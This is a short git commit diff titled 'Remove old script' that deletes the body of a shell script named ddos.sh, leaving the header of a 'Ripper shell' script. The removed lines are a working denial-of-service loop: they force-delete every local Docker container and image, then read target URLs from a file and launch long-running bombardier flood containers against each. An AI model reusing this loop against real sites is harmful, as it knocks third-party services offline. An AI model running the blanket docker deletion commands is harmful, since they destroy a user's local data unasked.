4350559fde45bd0be36a3716d022a41bfd19e866
koterion <koterion317@gmail.com>
2022-02-27 13:05:51 +0200

    Remove old script

--- ddos.sh
+++ ddos.sh
@@ -1,23 +1,4 @@
 #!/bin/bash
-
-docker rm -f $(docker ps -a -q)
-docker rmi -f $(docker images -q)
-
-IFS=$'\n' read -d '' -r -a lines < ./resources.txt
-
-for i in "${lines[@]}"
-do
-   echo "$i"
-   export URL=$i
-    if [ -n "$1" ]
-    then
-    docker run --platform linux/amd64 -d  alpine/bombardier -c $1 -d 60000h -l $URL
-    else
-    docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $URL
-    fi
- done
-
-#!/bin/bash
 # Ripper shell v1.0
 
 VERSION='1.0'
